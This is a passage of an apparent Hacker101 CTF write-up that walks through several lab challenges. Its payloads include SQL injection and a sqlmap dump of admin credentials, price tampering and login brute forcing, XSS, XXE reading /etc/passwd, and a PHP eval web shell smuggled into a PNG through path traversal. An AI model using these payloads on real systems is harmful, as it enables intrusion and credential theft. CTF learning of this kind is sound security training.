+<p>Reduce <strong>RDER BY</strong> number until it shows web page properly again.</p>
+<p>While <strong>ORDER BY 4</strong> still shows ERROR but <strong>ORDER BY 3</strong> can perform correct. This means the Table selection has 3 fields.</p>
+<h3 id="0x03-Check-Output-Locations"><a href="#0x03-Check-Output-Locations" class="headerlink" title="0x03 Check Output Locations"></a>0x03 Check Output Locations</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticket?id=1.1 UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag1/imgs/output.jpg" alt></p>
+<h3 id="0x04-Get-Current-Database-Version-TABLE-SCHEMA"><a href="#0x04-Get-Current-Database-Version-TABLE-SCHEMA" class="headerlink" title="0x04 Get Current Database Version, TABLE_SCHEMA"></a>0x04 Get Current Database Version, TABLE_SCHEMA</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticket?id=1.1 UNION <span class="keyword">SELECT</span> <span class="keyword">VERSION</span>(),<span class="keyword">DATABASE</span>(),<span class="number">3</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag1/imgs/db.jpg" alt></p>
+<h3 id="0x05-Get-TABLE-NAME"><a href="#0x05-Get-TABLE-NAME" class="headerlink" title="0x05 Get TABLE_NAME"></a>0x05 Get TABLE_NAME</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticket?id=1.1 UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">GROUP_CONCAT</span>(TABLE_NAME),<span class="number">3</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="keyword">DATABASE</span>()<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag1/imgs/tables.jpg" alt></p>
+<p>So the useful TABLE_NAME = users</p>
+<h3 id="0x06-Get-COLUMN-NAME"><a href="#0x06-Get-COLUMN-NAME" class="headerlink" title="0x06 Get COLUMN_NAME"></a>0x06 Get COLUMN_NAME</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticket?id=1.1 UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">GROUP_CONCAT</span>(COLUMN_NAME),<span class="number">3</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="keyword">DATABASE</span>() <span class="keyword">AND</span> TABLE_NAME=<span class="string">'users'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag1/imgs/columns.jpg" alt></p>
+<h3 id="0x07-Dump-Data-FLAG"><a href="#0x07-Dump-Data-FLAG" class="headerlink" title="0x07 Dump Data (FLAG)"></a>0x07 Dump Data (FLAG)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ticket?id=1.1 UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">password</span>,<span class="number">3</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'admin'</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag1/imgs/flag.jpg" alt></p>
+<h3 id="0x08-Why-Do-Not-Use-SQLMAP"><a href="#0x08-Why-Do-Not-Use-SQLMAP" class="headerlink" title="0x08 Why Do Not Use SQLMAP?"></a>0x08 Why Do Not Use SQLMAP?</h3><p>Ok, let’s do it with <a href="http://127.0.0.1/xxxxxxxxxx/?post=123456ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">SQLMAP</a> again.</p>
+<h4 id="Catch-the-Request-and-Save-to-a-File"><a href="#Catch-the-Request-and-Save-to-a-File" class="headerlink" title="Catch the Request and Save to a File"></a>Catch the Request and Save to a File</h4><p>Save the following request to the file <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">request.txt</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /xxxxxxxxxx/ticket?id=1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session_level7b=&#123;ADMIN SESSION&#125;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure>
+
+<p>And run the following command</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r request.txt --dump</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/ticketastic_live_instance/flag1/imgs/flag1.jpg" alt></p>
+<h2 id="Petshop-Pro"><a href="#Petshop-Pro" class="headerlink" title="Petshop Pro"></a>Petshop Pro</h2><h3 id="Flag0-–-Found-8"><a href="#Flag0-–-Found-8" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>Something looks out of place with checkout</li>
+<li>It’s always nice to get free stuff</li>
+</ul>
+<h3 id="Flag1-–-Found-6"><a href="#Flag1-–-Found-6" class="headerlink" title="Flag1 – Found"></a><a href="./flag1">Flag1</a> – Found</h3><ul>
+<li>There must be a way to administer the app</li>
+<li>Tools may help you find the entrypoint</li>
+<li>Tools are also great for finding credentials</li>
+</ul>
+<h3 id="Flag2-–-Found-5"><a href="#Flag2-–-Found-5" class="headerlink" title="Flag2 – Found"></a><a href="./flag2">Flag2</a> – Found</h3><ul>
+<li>Always test every input</li>
+<li>Bugs don’t always appear in a place where the data is entered</li>
+</ul>
+<h2 id="Petshop-Pro-FLAG0"><a href="#Petshop-Pro-FLAG0" class="headerlink" title="Petshop Pro - FLAG0"></a>Petshop Pro - FLAG0</h2><h3 id="0x00-Index-11"><a href="#0x00-Index-11" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/petshop_pro/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Shopping-Cart"><a href="#0x01-Shopping-Cart" class="headerlink" title="0x01 Shopping Cart"></a>0x01 Shopping Cart</h3><p><img src="./hacker101-ctf/petshop_pro/flag0/imgs/cart.jpg" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cart=%5B%5B1%2C+%7B%22logo%22%3A+%22puppy.jpg%22%2C+%22price%22%3A+7.95%2C+%22name%22%3A+%22Puppy%22%2C+%22desc%22%3A+%228%5C%22x10%5C%22+color+glossy+photograph+of+a+puppy.%22%7D%5D%5D</span><br></pre></td></tr></table></figure>
+
+<p>Decoded</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cart=[[1, &#123;&quot;logo&quot;: &quot;puppy.jpg&quot;, &quot;price&quot;: 7.95, &quot;name&quot;: &quot;Puppy&quot;, &quot;desc&quot;: &quot;8\&quot;x10\&quot; color glossy photograph of a puppy.&quot;&#125;]]</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/petshop_pro/flag0/imgs/burp.jpg" alt></p>
+<h3 id="0x02-Change-Price-to-0"><a href="#0x02-Change-Price-to-0" class="headerlink" title="0x02 Change Price to 0"></a>0x02 Change Price to 0</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cart=%5B%5B1%2C+%7B%22logo%22%3A+%22puppy.jpg%22%2C+%22price%22%3A+0%2C+%22name%22%3A+%22Puppy%22%2C+%22desc%22%3A+%228%5C%22x10%5C%22+color+glossy+photograph+of+a+puppy.%22%7D%5D%5D</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-FLAG-6"><a href="#0x03-FLAG-6" class="headerlink" title="0x03 FLAG"></a>0x03 FLAG</h3><p><img src="./hacker101-ctf/petshop_pro/flag0/imgs/flag.jpg" alt></p>
+<h2 id="Petshop-Pro-FLAG1"><a href="#Petshop-Pro-FLAG1" class="headerlink" title="Petshop Pro - FLAG1"></a>Petshop Pro - FLAG1</h2><h3 id="0x00-Index-12"><a href="#0x00-Index-12" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/petshop_pro/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Path-Scan"><a href="#0x01-Path-Scan" class="headerlink" title="0x01 Path Scan"></a>0x01 Path Scan</h3><p>Used <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">7kbscan-WebPathBrute</a> and corresponding dir dictionary for path scanning.</p>
+<p><img src="./hacker101-ctf/petshop_pro/flag1/imgs/path.jpg" alt></p>
+<h3 id="0x02-Admin-Login-path"><a href="#0x02-Admin-Login-path" class="headerlink" title="0x02 Admin Login path"></a>0x02 Admin Login path</h3><p><a href="http://127.0.0.1/xxxxxxxxxx/login" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/login</a></p>
+<p><img src="./hacker101-ctf/petshop_pro/flag1/imgs/admin-login.jpg" alt></p>
+<h3 id="0x03-Try-Login"><a href="#0x03-Try-Login" class="headerlink" title="0x03 Try Login"></a>0x03 Try Login</h3><p>Try with weak password, admin + admin. Shows <strong>Invalid username</strong> error.</p>
+<p>This can help to brute force admin username.</p>
+<p><img src="./hacker101-ctf/petshop_pro/flag1/imgs/invalid_username.jpg" alt></p>
+<h3 id="0x04-Get-Username"><a href="#0x04-Get-Username" class="headerlink" title="0x04 Get Username"></a>0x04 Get Username</h3><p>Catch the request and send to Intruder.</p>
+<p><img src="./hacker101-ctf/petshop_pro/flag1/imgs/burp_username.jpg" alt></p>
+<p>With the help of this <a href="http://127.0.0.1/xxxxxxxxxx/?post=123456ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">username wordlist</a>, finally get the admin username.</p>
+<p><img src="./hacker101-ctf/petshop_pro/flag1/imgs/username.jpg" alt></p>
+<h3 id="0x05-Get-Password"><a href="#0x05-Get-Password" class="headerlink" title="0x05 Get Password"></a>0x05 Get Password</h3><p>With pretty much same method as above, here I get the password. </p>
+<p><img src="./hacker101-ctf/petshop_pro/flag1/imgs/password.jpg" alt></p>
+<h3 id="0x06-FLAG"><a href="#0x06-FLAG" class="headerlink" title="0x06 FLAG"></a>0x06 FLAG</h3><p>So succefully log in.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=verla</span><br><span class="line">password=jester</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/petshop_pro/flag1/imgs/flag.jpg" alt></p>
+<h2 id="Petshop-Pro-FLAG2"><a href="#Petshop-Pro-FLAG2" class="headerlink" title="Petshop Pro - FLAG2"></a>Petshop Pro - FLAG2</h2><h3 id="0x00-Admin-Index"><a href="#0x00-Admin-Index" class="headerlink" title="0x00 Admin Index"></a>0x00 Admin Index</h3><p><img src="./hacker101-ctf/petshop_pro/flag1/imgs/flag.jpg" alt></p>
+<h3 id="0x01-Edit-Page"><a href="#0x01-Edit-Page" class="headerlink" title="0x01 Edit Page"></a>0x01 Edit Page</h3><p>Insert with XSS code for all possible inputs.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/petshop_pro/flag2/imgs/edit.jpg" alt></p>
+<h3 id="0x02-FLAG-6"><a href="#0x02-FLAG-6" class="headerlink" title="0x02 FLAG"></a>0x02 FLAG</h3><p>Add them into cart and go check the shopping cart.</p>
+<p><img src="./hacker101-ctf/petshop_pro/flag2/imgs/flag.jpg" alt></p>
+<h2 id="Model-E1337-Rolling-Code-Lock"><a href="#Model-E1337-Rolling-Code-Lock" class="headerlink" title="Model E1337 - Rolling Code Lock"></a>Model E1337 - Rolling Code Lock</h2><h3 id="Flag0-–-Found-9"><a href="#Flag0-–-Found-9" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>Hidden functionality is good functionality</li>
+<li>Comments can often reveal important things</li>
+<li>XML from untrusted sources must be processed carefully</li>
+<li>This application runs on the uwsgi-nginx-flask-docker image</li>
+</ul>
+<h3 id="Flag1-–-Not-Found-1"><a href="#Flag1-–-Not-Found-1" class="headerlink" title="Flag1 – Not Found"></a><a href="./flag1">Flag1</a> – Not Found</h3><h2 id="Model-E1337-Rolling-Code-Lock-FLAG0"><a href="#Model-E1337-Rolling-Code-Lock-FLAG0" class="headerlink" title="Model E1337 - Rolling Code Lock - FLAG0"></a>Model E1337 - Rolling Code Lock - FLAG0</h2><h3 id="0x00-Home-3"><a href="#0x00-Home-3" class="headerlink" title="0x00 Home"></a>0x00 Home</h3><p><img src="./hacker101-ctf/model_e1337-rolling_code_lock/flag0/imgs/home.jpg" alt></p>
+<p>Tried couple of different code but all show errors.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Code incorrect. Expected 06947342</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x01-Directory"><a href="#0x01-Directory" class="headerlink" title="0x01 Directory"></a>0x01 Directory</h3><p>Try scan sub directory with Burp</p>
+<p><img src="./hacker101-ctf/model_e1337-rolling_code_lock/flag0/imgs/directory.jpg" alt></p>
+<p>And there is a comment in source code.</p>
+<p><a href="http://127.0.0.1/xxxxxxxxxx/admin" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/admin</a></p>
+<p><img src="./hacker101-ctf/model_e1337-rolling_code_lock/flag0/imgs/admin.jpg" alt></p>
+<h3 id="0x02-get-config"><a href="#0x02-get-config" class="headerlink" title="0x02 get-config"></a>0x02 get-config</h3><p><a href="http://127.0.0.1/xxxxxxxxxx/get-config" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/get-config</a></p>
+<p>Looks like some config thing using XML</p>
+<p><img src="./hacker101-ctf/model_e1337-rolling_code_lock/flag0/imgs/get-config.jpg" alt></p>
+<h3 id="0x03-set-config"><a href="#0x03-set-config" class="headerlink" title="0x03 set-config"></a>0x03 set-config</h3><p><a href="http://127.0.0.1/xxxxxxxxxx/set-config" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/set-config</a></p>
+<p>It actually exist but may need parameter to set the XML</p>
+<p><img src="./hacker101-ctf/model_e1337-rolling_code_lock/flag0/imgs/set-config.jpg" alt></p>
+<h3 id="0x04-XXE"><a href="#0x04-XXE" class="headerlink" title="0x04 XXE"></a>0x04 XXE</h3><p>Prepare the XXE payload.</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "/etc/passwd"&gt;]&gt;</span><span class="tag">&lt;<span class="name">config</span>&gt;</span><span class="tag">&lt;<span class="name">location</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">location</span>&gt;</span><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>And encode to <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">url format</a> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://127.0.0.1/xxxxxxxxxx/get-config?param=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/get-config?param=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22%2Fetc%2Fpasswd%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E</a></p>
+<p><img src="./hacker101-ctf/model_e1337-rolling_code_lock/flag0/imgs/param.jpg" alt></p>
+<p>Successfully write in XXE and 302 redirect to admin page and read out /etc/passwd</p>
+<p><img src="./hacker101-ctf/model_e1337-rolling_code_lock/flag0/imgs/passwd.jpg" alt></p>
+<h3 id="0x05-main-py"><a href="#0x05-main-py" class="headerlink" title="0x05 main.py"></a>0x05 main.py</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM "main.py"&gt;]&gt;</span><span class="tag">&lt;<span class="name">config</span>&gt;</span><span class="tag">&lt;<span class="name">location</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">location</span>&gt;</span><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="http://127.0.0.1/xxxxxxxxxx/get-config?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22main.py%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E" target="_blank" rel="noopener">http://127.0.0.1/xxxxxxxxxx/get-config?data=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22main.py%22%3E%5D%3E%3Cconfig%3E%3Clocation%3E%26xxe%3B%3C%2Flocation%3E%3C%2Fconfig%3E</a></p>
+<p>Execute and get the FLAG in the <a href="http://127.0.0.1/xxxxxxxxxx/?post=123456ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">main.py</a></p>
+<p><img src="./hacker101-ctf/model_e1337-rolling_code_lock/flag0/imgs/flag.jpg" alt></p>
+<h2 id="TempImage"><a href="#TempImage" class="headerlink" title="TempImage"></a>TempImage</h2><h3 id="Flag0-–-Found-10"><a href="#Flag0-–-Found-10" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>File uploads can be hard to pin down</li>
+<li>What happens to your filename when you see an uploaded file?</li>
+<li>What if you make a small change to the path?</li>
+</ul>
+<h3 id="Flag1-–-Found-7"><a href="#Flag1-–-Found-7" class="headerlink" title="Flag1 – Found"></a><a href="./flag1">Flag1</a> – Found</h3><ul>
+<li>It clearly wants one specific format</li>
+<li>If you can’t bypass that check, what can you do?</li>
+<li>Read up on PNG chunks</li>
+</ul>
+<h2 id="TempImage-FLAG0"><a href="#TempImage-FLAG0" class="headerlink" title="TempImage - FLAG0"></a>TempImage - FLAG0</h2><h3 id="0x00-Index-13"><a href="#0x00-Index-13" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/tempimage/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Upload"><a href="#0x01-Upload" class="headerlink" title="0x01 Upload"></a>0x01 Upload</h3><p><img src="./hacker101-ctf/tempimage/flag0/imgs/upload.jpg" alt></p>
+<p>The image is successfully uploaded to the site.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5001/xxxxxxxxxx/files/d10c88f869301b1238f53cfdff8e9d7c_img.png</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-Modify-File-Name"><a href="#0x02-Modify-File-Name" class="headerlink" title="0x02 Modify File Name"></a>0x02 Modify File Name</h3><p>Modify file name in Burp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;</span><br><span class="line"></span><br><span class="line">../img.png</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-Upload-Error-and-FLAG"><a href="#0x03-Upload-Error-and-FLAG" class="headerlink" title="0x03 Upload Error and FLAG"></a>0x03 Upload Error and FLAG</h3><p><img src="./hacker101-ctf/tempimage/flag0/imgs/flag.jpg" alt></p>
+<h2 id="TempImage-FLAG1"><a href="#TempImage-FLAG1" class="headerlink" title="TempImage - FLAG1"></a>TempImage - FLAG1</h2><h3 id="0x00-Index-14"><a href="#0x00-Index-14" class="headerlink" title="0x00 Index"></a>0x00 Index</h3><p><img src="./hacker101-ctf/tempimage/flag0/imgs/index.jpg" alt></p>
+<h3 id="0x01-Generate-Image-Shell"><a href="#0x01-Generate-Image-Shell" class="headerlink" title="0x01 Generate Image Shell"></a>0x01 Generate Image Shell</h3><p>Run bat file <a href="./gen_imgshell.bat">gen_imgshell.bat</a>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy img.png/b + webshell.php shell.png</span><br></pre></td></tr></table></figure>
+
+<p>Get shell.png which has the injected code.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'hacker1'</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="./hacker101-ctf/tempimage/flag1/shell.png" alt></p>
+<h3 id="0x02-Upload-the-Image-Shell"><a href="#0x02-Upload-the-Image-Shell" class="headerlink" title="0x02 Upload the Image Shell"></a>0x02 Upload the Image Shell</h3><p>Catch the request and change the file name.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;filename&quot;</span><br><span class="line"></span><br><span class="line">/../../shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Shell upload successfully.</p>
+<p><img src="./hacker101-ctf/tempimage/flag1/imgs/shell_upload.jpg" alt></p>
+<h3 id="0x03-Connect-Server"><a href="#0x03-Connect-Server" class="headerlink" title="0x03 Connect Server"></a>0x03 Connect Server</h3><p><img src="./hacker101-ctf/tempimage/flag1/imgs/caidao.jpg" alt></p>
+<h3 id="0x04-FLAG-2"><a href="#0x04-FLAG-2" class="headerlink" title="0x04 FLAG"></a>0x04 FLAG</h3><p>Flag can be found in index.php</p>
+<p><img src="./hacker101-ctf/tempimage/flag1/imgs/flag.jpg" alt></p>
+<h2 id="H1-Thermostat"><a href="#H1-Thermostat" class="headerlink" title="H1 Thermostat"></a>H1 Thermostat</h2><h3 id="Flag0-–-Found-11"><a href="#Flag0-–-Found-11" class="headerlink" title="Flag0 – Found"></a><a href="./flag0">Flag0</a> – Found</h3><ul>
+<li>Communication is key</li>
+<li>Have you looked at what the app is sending to the server?</li>
+</ul>
+<h3 id="Flag1-–-Found-8"><a href="#Flag1-–-Found-8" class="headerlink" title="Flag1 – Found"></a><a href="./flag1">Flag1</a> – Found</h3><ul>
+<li>Doesn’t the MAC seem interesting?</li>
+<li>Access to the source code would help</li>
+<li>Check out the <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">Android Quickstart</a> video from Hacker101</li>
+</ul>
+<h2 id="H1-Thermostat-FLAG0"><a href="#H1-Thermostat-FLAG0" class="headerlink" title="H1 Thermostat - FLAG0"></a>H1 Thermostat - FLAG0</h2><h3 id="0x00-Configure-Proxy"><a href="#0x00-Configure-Proxy" class="headerlink" title="0x00 Configure Proxy"></a>0x00 Configure Proxy</h3><p>Set Android Emulator use the Burp proxy. </p>
+<p><img src="./hacker101-ctf/h1_thermostat/flag0/imgs/proxy.jpg" alt></p>
+<h3 id="0x01-Install-APK"><a href="#0x01-Install-APK" class="headerlink" title="0x01 Install APK"></a>0x01 Install APK</h3><p>Just drug apk to install it into Android Emulator. And start the app.</p>
+<p>Here comes the first FLAG in the POST request.</p>
+<p><img src="./hacker101-ctf/h1_thermostat/flag0/imgs/flag.jpg" alt></p>
+<h2 id="H1-Thermostat-FLAG1"><a href="#H1-Thermostat-FLAG1" class="headerlink" title="H1 Thermostat - FLAG1"></a>H1 Thermostat - FLAG1</h2><h3 id="0x00-Params"><a href="#0x00-Params" class="headerlink" title="0x00 Params"></a>0x00 Params</h3><p>There are different messages sending through. We can decode them with <a href="http://127.0.0.1/xxxxxxxxxx/?post=6ybKGEfF47eN1k5eyj!lsraaVXFME-xBz51ocCeiAZPULUMIemubmPanqBO04ixb-01L-Qek7nUeXitmNAEMNrJ5BbfeP5GWD1hYEuHciAk81fRa4IyuvmcIG3sE1K11mM7s7hA1P1mChArqJR4i5wSrOF7O561nOHu!lGQcA1iFos-jU6x7iy-TJ4iI4yZjnHkcdXT2F9y6fH4!TY!DcA~~" target="_blank" rel="noopener">base64</a>.</p>
+<table>
+<thead>
+<tr>
+<th>encoded</th>
+<th>readable</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>eyJjbWQiOiJnZXRUZW1wIn0</td>
+<td>{“cmd”:”getTemp”}</td>
+</tr>
+<tr>
+<td>eyJ0ZW1wZXJhdHVyZSI6IDc3LCAic3VjY2VzcyI6IHRydWV9</td>
